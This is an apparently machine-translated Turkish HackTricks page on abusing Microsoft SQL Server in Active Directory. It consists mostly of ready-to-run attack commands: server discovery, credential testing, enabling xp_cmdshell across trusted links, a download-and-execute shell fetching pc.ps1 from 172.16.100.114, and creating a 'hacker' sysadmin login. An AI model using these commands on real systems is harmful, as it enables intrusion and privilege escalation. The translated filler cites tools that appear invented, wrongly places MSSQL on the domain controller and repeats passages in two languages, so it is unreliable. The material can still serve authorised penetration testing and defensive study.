# MSSQL AD Kötüye Kullanımı

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan ileri seviyeye öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'a katılın!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>

## **MSSQL Tespit / Keşif**

Bu durumda [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) adlı PowerShell modülü çok kullanışlıdır.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Etki alanı oturumu olmadan ağdan numaralandırma

Bu bölümde, etki alanı oturumu olmadan ağdan numaralandırma yöntemlerini ele alacağız. Bu teknikler, hedef ağdaki bilgileri elde etmek için kullanılabilir.

#### MSSQL Sunucusu Üzerinden Enumerasyon

MSSQL sunucusu, etki alanı denetleyicisi (Domain Controller) üzerinde çalışan bir veritabanı sunucusudur. Bu sunucu üzerindeki veritabanı, etki alanı hakkında önemli bilgiler içerebilir. Aşağıda, MSSQL sunucusu üzerinden etki alanı hakkında bilgi toplamak için kullanılabilecek bazı teknikler bulunmaktadır:

##### 1. MSSQL Bağlantı Dizelerini Deneme

MSSQL sunucusuna bağlanmak için kullanılan bağlantı dizeleri, etki alanı hakkında bilgi sağlayabilir. Bu bağlantı dizeleri, genellikle uygulama yapılandırma dosyalarında bulunur. Aşağıda, bu bağlantı dizelerini denemek için kullanılabilecek bazı araçlar bulunmaktadır:

- [MSSQLPing](https://github.com/NetSPI/MSSQLPing)
- [MSSQLScan](https://github.com/NetSPI/MSSQLScan)

Bu araçlar, MSSQL sunucusuna bağlanmak için farklı bağlantı dizelerini deneyerek etki alanı hakkında bilgi sağlar.

##### 2. MSSQL Sunucusu Üzerinde Sorgu Çalıştırma

MSSQL sunucusuna bağlandıktan sonra, sunucu üzerinde sorgu çalıştırarak etki alanı hakkında bilgi elde edilebilir. Aşağıda, MSSQL sunucusu üzerinde sorgu çalıştırmak için kullanılabilecek bazı araçlar bulunmaktadır:

- [MSSQLClient](https://github.com/NetSPI/MSSQLClient)
- [MSSQLDump](https://github.com/NetSPI/MSSQLDump)

Bu araçlar, MSSQL sunucusu üzerinde sorgu çalıştırarak etki alanı hakkında bilgi elde etmenizi sağlar.

##### 3. MSSQL Sunucusu Üzerinde Zayıf Şifre Denemesi

MSSQL sunucusuna bağlanmak için kullanılan hesapların zayıf şifrelerle korunması durumunda, bu hesaplar üzerinden etki alanı hakkında bilgi elde edilebilir. Aşağıda, zayıf şifre denemesi yapmak için kullanılabilecek bazı araçlar bulunmaktadır:

- [MSSQLSpray](https://github.com/NetSPI/MSSQLSpray)
- [MSSQLCrack](https://github.com/NetSPI/MSSQLCrack)

Bu araçlar, MSSQL sunucusuna zayıf şifre denemesi yaparak etki alanı hakkında bilgi elde etmenizi sağlar.

Bu teknikler, etki alanı oturumu olmadan ağdan numaralandırma yapmanıza yardımcı olabilir. Ancak, bu işlemleri gerçekleştirirken yasal izinleri almanız önemlidir.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Etki Alanı İçerisinden Sorgulama Yapma

When conducting a penetration test or security assessment, it is often necessary to gather information from within the target domain. This can help identify potential vulnerabilities and weaknesses that can be exploited. In the context of Active Directory (AD) environments, there are several techniques that can be used to enumerate information from inside the domain.

Bir penetrasyon testi veya güvenlik değerlendirmesi yaparken, hedef etki alanı içerisinden bilgi toplamak genellikle gereklidir. Bu, sömürülebilecek potansiyel zayıflıkları ve güvenlik açıklarını belirlemeye yardımcı olabilir. Active Directory (AD) ortamlarında, etki alanı içerisinden bilgi sorgulamak için kullanılabilecek birkaç teknik bulunmaktadır.

#### Abusing MS-SQL Server

##### MS-SQL Server Abuse

One technique involves abusing the MS-SQL Server that is often present in AD environments. By exploiting misconfigurations or weak security settings, an attacker can gain unauthorized access to the database and extract valuable information.

Bir teknik, genellikle AD ortamlarında bulunan MS-SQL Server'ı kötüye kullanmaktır. Yanlış yapılandırmaları veya zayıf güvenlik ayarlarını sömürerek, saldırgan yetkisiz erişim elde edebilir ve değerli bilgileri çıkarabilir.

##### Extracting Information

Once access to the MS-SQL Server is obtained, the attacker can extract various types of information from the database. This can include usernames, passwords, hashes, and other sensitive data that can be used for further attacks or privilege escalation.

MS-SQL Server'a erişim sağlandığında, saldırgan veritabanından çeşitli bilgileri çıkarabilir. Bu, kullanıcı adları, şifreler, karma değerleri ve diğer hassas verileri içerebilir ve daha fazla saldırı veya ayrıcalık yükseltme için kullanılabilir.

##### Tools and Techniques

There are several tools and techniques that can be used to abuse MS-SQL Server in an AD environment. These include using SQL injection attacks, exploiting weak credentials, or leveraging known vulnerabilities in the server software.

AD ortamında MS-SQL Server'ı kötüye kullanmak için kullanılabilecek birkaç araç ve teknik bulunmaktadır. Bunlar, SQL enjeksiyon saldırıları kullanmak, zayıf kimlik bilgilerini sömürmek veya sunucu yazılımında bilinen güvenlik açıklarını kullanmak gibi yöntemleri içerir.

##### Mitigation

To mitigate the risk of MS-SQL Server abuse, it is important to ensure that the server is properly configured and secured. This includes regularly patching the server software, implementing strong authentication mechanisms, and monitoring for any suspicious activity.

MS-SQL Server kötüye kullanım riskini azaltmak için, sunucunun düzgün bir şekilde yapılandırıldığı ve güvence altına alındığından emin olmak önemlidir. Bu, sunucu yazılımını düzenli olarak güncellemek, güçlü kimlik doğrulama mekanizmaları uygulamak ve herhangi bir şüpheli faaliyeti izlemek anlamına gelir.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
MSSQL Temel Kötüye Kullanım

### Veritabanına Erişim

MSSQL Temel Kötüye Kullanım

Veritabanına Erişim
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL Uzaktan Komut Yürütme (RCE)

MSSQL sunucusu içinde **komutları yürütmek** de mümkün olabilir.
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL Temel Hacking İpuçları

Eğer bir MSSQL örneği, başka bir MSSQL örneği tarafından güvenilir olarak kabul ediliyorsa (veritabanı bağlantısı), kullanıcı güvenilir veritabanı üzerinde ayrıcalıklara sahipse, **güven ilişkisini kullanarak diğer örnekte de sorguları yürütebilecektir**. Bu güven ilişkileri zincirlenebilir ve kullanıcı, komutları yürütebileceği yanlış yapılandırılmış bir veritabanı bulabilir.

**Veritabanları arasındaki bağlantılar orman güven ilişkileri üzerinden bile çalışır.**

### Powershell Kötüye Kullanımı
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Metasploit kullanarak güvenilir bağlantıları kolayca kontrol edebilirsiniz.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Dikkat edin, metasploit yalnızca MSSQL'deki `openquery()` fonksiyonunu kötüye kullanmaya çalışacaktır (bu nedenle, `openquery()` ile komut çalıştıramazsanız komutları çalıştırmak için `EXECUTE` yöntemini **manuel olarak** denemeniz gerekecektir, aşağıda daha fazlasını görün.)

### Manuel - Openquery()

**Linux** üzerinden **sqsh** ve **mssqlclient.py** kullanarak bir MSSQL konsol kabuğu elde edebilirsiniz.

**Windows** üzerinden de [**HeidiSQL**](https://www.heidisql.com) gibi bir **MSSQL istemcisi kullanarak** bağlantıları bulabilir ve komutları manuel olarak çalıştırabilirsiniz.

_Windows kimlik doğrulaması kullanarak giriş yapın:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Güvenilir Bağlantıları Bulma
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### Güvenilir bir bağlantıda sorguları çalıştırın

Sorguları bağlantı üzerinden çalıştırın (örnek: yeni erişilebilir örnekte daha fazla bağlantı bulun):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Çift ve tek tırnakların nerede kullanıldığını kontrol edin, bu şekilde kullanmak önemlidir.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Bu güvenilir bağlantı zincirini manuel olarak sonsuza kadar devam ettirebilirsiniz.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Eğer `openquery()` içerisinden `exec xp_cmdshell` gibi işlemleri gerçekleştiremiyorsanız, `EXECUTE` yöntemiyle deneyin.

### Manuel - EXECUTE

`EXECUTE` kullanarak güvenilir bağlantıları da istismar edebilirsiniz:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Yerel İzin Yükseltme

**MSSQL yerel kullanıcısı** genellikle **`SeImpersonatePrivilege`** adı verilen özel bir ayrıcalığa sahiptir. Bu, hesabın "kimlik doğrulamadan sonra bir istemciyi taklit etmesine" izin verir.

Birçok yazar tarafından geliştirilen bir strateji, bir SİSTEM hizmetinin, saldırganın oluşturduğu sahte veya ara sunucuya kimlik doğrulaması yapmasını zorlamaktır. Bu sahte hizmet, kimlik doğrulama yapmaya çalışırken SİSTEM hizmetini taklit edebilir.

[SweetPotato](https://github.com/CCob/SweetPotato), bu çeşitli tekniklerin bir koleksiyonuna sahiptir ve Beacon'ın `execute-assembly` komutu aracılığıyla çalıştırılabilir.

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
